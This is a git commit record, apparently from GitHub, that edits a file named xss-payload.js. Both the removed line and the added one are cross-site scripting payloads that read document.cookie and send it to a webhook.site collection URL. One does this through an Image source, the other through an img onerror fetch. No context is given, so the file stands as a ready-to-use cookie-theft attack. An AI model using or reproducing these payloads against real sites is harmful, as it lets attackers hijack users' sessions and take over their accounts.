80c9e28079c8a66f7d545752188124a9ea8245fb
Nick Dandolos <128314429+b4ndit23@users.noreply.github.com>
2026-01-21 15:41:04 +0100

    Update xss-payload.js

--- xss-payload.js
+++ xss-payload.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = ' https://webhook.site/5c8c958e-5a74-4fbb-8d6c-c0f298bc44f9?data='+btoa(document.cookie);
+<img src=x onerror="fetch('https://webhook.site/5c8c958e-5a74-4fbb-8d6c-c0f298bc44f9' + document.cookie)" />
